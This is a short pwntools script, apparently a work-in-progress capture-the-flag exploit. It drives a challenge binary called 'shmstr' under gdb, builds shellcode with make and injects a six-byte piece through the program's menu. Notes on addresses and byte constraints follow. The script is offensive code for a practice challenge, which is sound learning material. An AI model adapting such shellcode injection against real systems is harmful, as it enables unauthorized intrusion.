#!/usr/bin/env python3

# nc 151.236.114.211 17173

from pwn import *
import os
import binascii

r = gdb.debug('./shmstr', '''
        b main
        c
        ''')

def logCmd(cmd):
    f = open('commands', 'ab')
    f.write(cmd + b'\n')
    f.close()
    r.sendline(cmd)

def getShellcode():
    os.system('make -s clean; make -s raw > payload; make -s clean')
    shellcode = open('payload', 'r').read()[:-2]
    shellcode = ''.join(shellcode.split("\\x"))
    shellcode = binascii.unhexlify(shellcode)
    return shellcode

os.system('rm -f commands')
print(r.recvuntil('> '))
r.sendline(b'1')

shellcode = getShellcode()
shellcode = shellcode[:6]
log.info(f'shellcode = {shellcode}')
r.sendline(shellcode)
print(r.clean())

r.sendline(b'4')
print(r.clean())
r.sendline(b'0')
print(r.clean())

"""
shellcode size <= 6
add_shellcode read = 0x56556470
c_type chelou = 0x565564ad

every byte:
    * 2
    + 0x20002
    [eax] (8 lsb)
    & 0x400
"""
